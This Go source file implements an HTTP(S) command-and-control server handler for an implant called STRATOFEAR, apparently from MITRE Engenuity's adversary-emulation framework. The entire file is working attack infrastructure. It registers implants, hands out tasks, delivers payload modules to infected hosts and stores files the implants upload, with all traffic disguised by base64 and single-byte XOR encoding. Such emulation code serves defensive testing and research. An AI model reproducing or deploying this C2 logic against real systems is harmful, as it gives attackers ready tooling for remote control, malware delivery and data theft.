package stratofear

import (
    "context"
    "encoding/base64"
    "encoding/json"
    "errors"
    "fmt"
    "io/ioutil"
    "net/http"
    "strings"
    "time"

    "attackevals.mitre-engenuity.org/control_server/config"
    "attackevals.mitre-engenuity.org/control_server/handlers/base_handler"
    "attackevals.mitre-engenuity.org/control_server/handlers/handler_manager"
    "attackevals.mitre-engenuity.org/control_server/handlers/handler_util"
    "attackevals.mitre-engenuity.org/control_server/logger"
    "attackevals.mitre-engenuity.org/control_server/sslcerts"

    "github.com/gorilla/mux"
)

const (
    HANDLER_NAME = "STRATOFEAR"

    // Implant Commands
    beacon       = "0x60"
    discovery    = "0x07"
    moduleInfo   = "0x61"
    loadModule   = "0x62"
    moduleOutput = "0x64"
    changeDir    = "0x66"
    etfMonitor   = "0x47"
)

var (
    xorKey                 = []byte("k")
    heartbeat, _           = json.Marshal(map[string]string{"id": beacon})
    SERVER_ERR_MSG, _      = json.Marshal(map[string]string{"id": "Internal server error"})
    ENCODED_SERVER_ERR_MSG = base64.StdEncoding.EncodeToString(xor(SERVER_ERR_MSG))
)

type stratofearHandler struct {
    baseHandler        *base_handler.BaseHandlerUtil
    wrappedFuncHandles *WrappedFuncHandles

    // to be initialized after init()
    server *http.Server
}

type WrappedFuncHandles struct {
    randStringGetter handler_util.RandAlphanumericStringGetter
}

// Factory method for creating an example C2 handler
func stratofearHandlerFactory(funcHandles *WrappedFuncHandles) *stratofearHandler {
    baseHandler := base_handler.BaseHandlerFactory(HANDLER_NAME)

    return &stratofearHandler{
        baseHandler:        baseHandler,
        wrappedFuncHandles: funcHandles,
    }
}

// Creates and adds the example C2 handler to the map of available C2 handlers.
func init() {
    // use production function wrappers
    wrappedFuncHandles := &WrappedFuncHandles{
        randStringGetter: handler_util.GetRandomAlphanumericString,
    }
    handler_manager.RegisterAvailableHandler(stratofearHandlerFactory(wrappedFuncHandles))
}

func (s *stratofearHandler) GetName() string {
    return HANDLER_NAME
}

// StartHandler starts the C2 handler
func (s *stratofearHandler) StartHandler(restAddress string, configEntry config.HandlerConfigEntry) error {
    // process the information from the configuration entry and use it to initialize the remaining handler variables, if any

    // set the bind and REST API addresses for the base handler
    err := s.baseHandler.SetBindAddr(configEntry)
    if err != nil {
        return err
    }
    s.baseHandler.SetRestApiAddr(restAddress)
    s.baseHandler.HandlerLogInfo("Starting %s Handler to listen on %s", s.baseHandler.Name, s.baseHandler.BindAddr)

    // set the https bool to true/false
    https, ok := configEntry["https"]
    if !ok {
        return errors.New(fmt.Sprintf("Config entry did not contain a HTTPS value.)"))
    }
    useHTTPS, _ := https.(bool)

    // initialize URL router
    urlRouter := mux.NewRouter()

    // bind HTTP routes to their functions - these functions will handle things like fetching tasks and files, uploading task results and files
    urlRouter.HandleFunc("/", s.HandleHeartbeat).Methods("POST")
    urlRouter.HandleFunc("/directory/v1/{identifier}", s.HandleGetTask).Methods("GET")
    urlRouter.HandleFunc("/directory/v1/{identifier}", s.HandleTaskResponse).Methods("POST")

    s.server = &http.Server{
        Addr:         s.baseHandler.BindAddr,
        WriteTimeout: time.Second * 15,
        ReadTimeout:  time.Second * 15,
        IdleTimeout:  time.Second * 60,
        Handler:      urlRouter,
    }

    if useHTTPS {
        cert_file, ok := configEntry["cert_file"]
        if !ok {
            cert_file = ""
        }
        certFile, _ := cert_file.(string)
        key_file, ok := configEntry["key_file"]
        if !ok {
            key_file = ""
        }
        keyFile, _ := key_file.(string)

        needToGenCert := sslcerts.CheckCert(certFile, keyFile)
        if needToGenCert {
            certFile, keyFile = sslcerts.GenerateSSLcert("stratofear", s.baseHandler.BindAddr)
        }
        logger.Info(fmt.Sprintf("\n%s HTTPS cert: ./%s\n%s HTTPS key: ./%s", HANDLER_NAME, certFile, HANDLER_NAME, keyFile))

        // start handler in goroutine so it doesn't block
        go func() {
            err := s.server.ListenAndServeTLS(certFile, keyFile)
            if err != nil && err.Error() != "https: Server closed" {
                logger.Error(err)
            }
        }()
    } else {
        // start handler in goroutine so it doesn't block
        go func() {
            err := s.server.ListenAndServe()
            if err != nil && err.Error() != "http: Server closed" {
                logger.Error(err)
            }
        }()
    }

    return nil
}

// StopHandler stops the C2 handler
func (s *stratofearHandler) StopHandler() error {
    s.baseHandler.HandlerLogInfo("Stopping %s Handler", s.baseHandler.Name)
    emptyContext := context.Background()
    return s.server.Shutdown(emptyContext)
}

// Handle POST requests for implant registration
func (s *stratofearHandler) HandleHeartbeat(w http.ResponseWriter, r *http.Request) {
    // extract the UID from POST body
    b64PostBody, err := ioutil.ReadAll(r.Body)
    if err != nil {
        s.baseHandler.HandlerLogError("Failed to read POST body: %s", err.Error())
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(ENCODED_SERVER_ERR_MSG))
        return
    }
    xorPostBody, _ := base64.StdEncoding.DecodeString(string(b64PostBody))
    implantId := string(xor(xorPostBody))

    // Check if we have seen this implant before - if not, create a new session for it
    if !s.baseHandler.HasImplantSession(implantId) {
        s.baseHandler.HandlerLogInfo("Received first-time task request from %s. Creating session.", implantId)
        sessionData := map[string]string{"guid": implantId}
        err = s.baseHandler.RegisterNewImplant(implantId, sessionData)
        if err != nil {
            s.baseHandler.HandlerLogError("Failed to register implant session for implant ID %s: %s", implantId, err.Error())
            w.WriteHeader(http.StatusInternalServerError)
            w.Write([]byte(ENCODED_SERVER_ERR_MSG))
            return
        }
    } else {
        s.baseHandler.HandlerLogError("Already an existing implant session for implant ID: %s", implantId)
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(ENCODED_SERVER_ERR_MSG))
        return
    }

    // Create & encode heartbeat response
    encodedHeart := base64.StdEncoding.EncodeToString(xor([]byte(heartbeat)))
    w.Write([]byte(encodedHeart))
}

// Handle GET requests for current implant task / heartbeat
func (s *stratofearHandler) HandleGetTask(w http.ResponseWriter, r *http.Request) {
    vars := mux.Vars(r)
    implantId, ok := vars["identifier"]
    var err error
    task := ""
    if !ok {
        s.baseHandler.HandlerLogError("handleGetTask: Request identifier not included in GET request.")
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(ENCODED_SERVER_ERR_MSG))
        return
    }

    // Check if we have seen this implant before - throw an error if not
    if !s.baseHandler.HasImplantSession(implantId) {
        s.baseHandler.HandlerLogError("No existing implant session for implant ID: %s", implantId)
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(ENCODED_SERVER_ERR_MSG))
        return
    } else {
        s.baseHandler.HandlerLogDebug("Received task request from %s", implantId)
        task, err = s.baseHandler.GetImplantTask(implantId)
        if err != nil {
            s.baseHandler.HandlerLogError("Failed to get task for implant ID %s: %s", implantId, err.Error())
            w.WriteHeader(http.StatusInternalServerError)
            w.Write([]byte(ENCODED_SERVER_ERR_MSG))
            return
        }
    }

    // Send heartbeat response if task is empty
    if task == "" {
        w.WriteHeader(http.StatusOK)
        w.Write([]byte(base64.StdEncoding.EncodeToString(xor([]byte(heartbeat)))))
        return
    }

    // Check for module download task, route to HandlePayloadDownload if so
    var taskData map[string]string
    err = json.Unmarshal([]byte(strings.TrimSpace(task)), &taskData)
    if err != nil {
        s.baseHandler.HandlerLogError("Unable to format task for implant ID: %s", implantId)
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(ENCODED_SERVER_ERR_MSG))
        return
    }

    if cmdID, ok := taskData["id"]; ok {
        if cmdID == loadModule {
            s.HandlePayloadDownload(w, r, taskData)
            return
        }
        s.baseHandler.HandlerLogInfo("Tasking implant %s with task: %s", implantId, task)
        w.Write([]byte(base64.StdEncoding.EncodeToString(xor([]byte(task)))))
    } else {
        s.baseHandler.HandlerLogError("Command ID not included in task string for implant ID: %s", implantId)
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(ENCODED_SERVER_ERR_MSG))
        return
    }

}

// Handle POST requests for task output
func (s *stratofearHandler) HandleTaskResponse(w http.ResponseWriter, r *http.Request) {
    vars := mux.Vars(r)
    implantId := vars["identifier"]
    b64Resp, err := ioutil.ReadAll(r.Body)
    if err != nil {
        s.baseHandler.HandlerLogError("Failed to read task response for implant ID %s: %s", implantId, err.Error())
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(ENCODED_SERVER_ERR_MSG))
        return
    }

    // Base64 decode & XOR post body
    xorResp, _ := base64.StdEncoding.DecodeString(string(b64Resp))
    resp := xor(xorResp)

    // Try to Unmarshal data & check for file upload task response, route to HandleFileUpload if successful
    var packet map[string]interface{}
    err = json.Unmarshal(resp, &packet)
    if err == nil {
        if id, ok := packet["id"]; ok {
            if id.(string) == moduleOutput {
                s.HandleFileUpload(w, r, packet)
                return
            }
        }
        s.baseHandler.HandlerLogError("JSON response does not contain valid command ID for implant ID %s", implantId)
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(ENCODED_SERVER_ERR_MSG))
        return
    }

    // If not file upload task response, forward resp body to REST API
    s.baseHandler.HandlerLogInfo("Received task response from %s. Registering task output.", implantId)
    _, err = s.baseHandler.RegisterTaskOutput(implantId, resp)
    if err != nil {
        s.baseHandler.HandlerLogError("Failed to register response for implant ID %s: %s", implantId, err.Error())
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(ENCODED_SERVER_ERR_MSG))
        return
    }
    fmt.Fprint(w, base64.StdEncoding.EncodeToString(xor([]byte(heartbeat))))
}

// Handle GET requests for payload downloads
func (s *stratofearHandler) HandlePayloadDownload(w http.ResponseWriter, r *http.Request, taskData map[string]string) {
    filename, ok := taskData["args"]
    if !ok {
        s.baseHandler.HandlerLogError("Payload name not provided in task string.")
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(ENCODED_SERVER_ERR_MSG))
        return
    }
    s.baseHandler.HandlerLogInfo("Fetching requested payload for task: %s", filename)

    // Get file bytes
    fileData, err := s.baseHandler.GetFileFromRestServer(filename)
    if err != nil {
        s.baseHandler.HandlerLogError("Failed to perform file download request for file %s: %s", filename, err.Error())
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(ENCODED_SERVER_ERR_MSG))
        return
    }

    // Create/encode the task string
    task, _ := json.Marshal(map[string]interface{}{"id": taskData["id"], "moduleBytes": base64.StdEncoding.EncodeToString(fileData)})
    encodedTask := base64.StdEncoding.EncodeToString(xor([]byte(task)))

    // Send payload data to implant
    w.WriteHeader(http.StatusOK)
    w.Write([]byte(encodedTask))

    s.baseHandler.HandlerLogSuccess("Sent file %s", filename)
}

// Handle POST requests for file uploads
// Expects filename in the json packet. If no filename is provided, the file will be saved under a random filename
func (s *stratofearHandler) HandleFileUpload(w http.ResponseWriter, r *http.Request, taskData map[string]interface{}) {
    var filename string
    if filenameInt, ok := taskData["moduleName"]; ok {
        filename = filenameInt.(string)
        s.baseHandler.HandlerLogInfo("Received file upload request to upload file as %s.", filename)
    } else {
        filename = s.wrappedFuncHandles.randStringGetter(7)
        s.baseHandler.HandlerLogInfo("Received file upload request without a destination filename header. Generated random filename %s as the destination.", filename)
    }

    // Get upload data
    var fileData []byte
    if fileDataInt, ok := taskData["moduleBytes"]; ok {
        fileData, _ = base64.StdEncoding.DecodeString(fileDataInt.(string))
    } else {
        s.baseHandler.HandlerLogError("File upload request for file %s does not contain file bytes.", filename)
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(ENCODED_SERVER_ERR_MSG))
        return
    }

    // Save file via REST API
    _, err := s.baseHandler.SaveUploadedFile(filename, fileData)
    if err != nil {
        s.baseHandler.HandlerLogError("Failed to save file %s: %s", filename, err.Error())
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(ENCODED_SERVER_ERR_MSG))
        return
    }
    s.baseHandler.HandlerLogSuccess("Successfully saved uploaded file as %s", filename)

    encodedResp := base64.StdEncoding.EncodeToString(xor([]byte(heartbeat)))
    w.Write([]byte(encodedResp))
}

// XORs the byte array with the XOR key
func xor(data []byte) []byte {
    xorData := make([]byte, len(data))
    for i := range data {
        xorData[i] = data[i] ^ xorKey[0]
    }
    return xorData
}
